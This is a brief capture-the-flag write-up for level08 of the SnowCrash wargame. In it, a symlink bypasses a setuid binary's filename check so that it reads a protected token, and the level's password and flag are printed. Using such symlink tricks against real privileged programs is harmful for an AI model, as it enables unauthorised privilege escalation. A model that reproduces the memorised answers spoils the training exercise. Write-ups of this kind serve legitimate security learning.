# Snow-crash - level08

```bash
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```
* But if it try to exec, and display the token file... token seems bloked
```bash
level08@SnowCrash:~$ ./level08 
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token 
You may not access 'token'
level08@SnowCrash:~$ cat token
cat: token: Permission denied
```
* Let's bypass the permission with *ln* command, and get the flag
```bash
level08@SnowCrash:~$ ln -sf /home/user/level08/token /tmp/flag && ./level08 /tmp/flag
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
